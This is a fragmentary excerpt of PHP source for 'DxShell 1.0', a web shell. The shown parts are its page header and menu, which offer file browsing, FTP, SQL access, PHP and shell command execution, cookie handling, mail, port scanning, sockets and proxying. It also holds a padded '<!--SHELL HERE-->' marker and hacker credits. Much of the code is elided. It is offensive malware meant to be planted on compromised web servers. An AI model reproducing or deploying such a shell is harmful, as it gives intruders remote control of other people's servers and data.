...
if ($DXGLOBALSHIT)
	print str_repeat("\n", 20).'<!--SHELL HERE-->';
?>
<html><head><title><?php echo $_SERVER['HTTP_HOST'];?> --= DxShell 1.0 - by o_O Tync =-- :: <?php echo$GLOB['DxMODES'][$_GET['dxmode']];?></title>
<Meta Http-equiv="Content-Type" Content="text/html; Charset=windows-1251">
<link rel="shortcut icon" href="<?php echo DxURL('kill','dxmode');?>&dxmode=IMG&dximg=DxS">
<style>
...
<tr>
	<td width=100pt class=h2_oneline><a href="<?php echo DxURL('kill', '');?>&dxmode=WTF" class=no><h1>DxShell<br>v<?php echo $GLOB['SHELL']['Ver'];?></td>
	<td>
<?php
...
<tr>
	...
	<a href="<?php echo DxURL('kill', '');?>&dxmode=DIR">DIR</a> |
	<a href="<?php echo DxURL('kill', '');?>&dxmode=F_VIEW">VIEW</a> |
	<a href="<?php echo DxURL('kill', '');?>&dxmode=FTP<?php echo ((!empty($_GET['dxdir']))?'&dxdir='.$_GET['dxdir']:'');?>">FTP</a>
	<td><font class=highlight_txt><big><b>II</td><td style="text-align:center;"><nobr>
	<a href="<?php echo DxURL('leave', 'dxsql_s,dxsql_l,dxsql_p,dxsql_d');?>&dxmode=SQL">SQL</a> |
	<a href="<?php echo DxURL('kill', '');?>&dxmode=PHP">PHP</a> |
	<a href="<?php echo DxURL('kill', '');?>&dxmode=COOK">COOKIE</a> |
	<a href="<?php echo DxURL('kill', '');?>&dxmode=CMD">CMD</a>
	<td><font class=highlight_txt><big><b>II</td><td style="text-align:center;"><nobr>
	<a href="<?php echo DxURL('kill', '');?>&dxmode=MAIL">MAIL</a> |
	<a href="<?php echo DxURL('kill', '');?>&dxmode=STR">STR</a> |
	<a href="<?php echo DxURL('kill', '');?>&dxmode=PRT">PORTSCAN</a> |
	<a href="<?php echo DxURL('kill', '');?>&dxmode=SOCK">SOCK</a> |
	<a href="<?php echo DxURL('kill', '');?>&dxmode=PROX">PROXY</a>
	</td>
	</tr>
</table>
...
<table align=center>
	...
	@MODE: <b><?php echo$GLOB['DxMODES'][$_GET['dxmode']];?>
	</td></tr></table>
<?php
...
"DxShell v<?php echo $GLOB['SHELL']['Ver'].', date '.$GLOB['SHELL']['Date'];?>",
"",
"Greetz to: ",
"iNfantry the Ruler",
"Nik8 the Hekker",
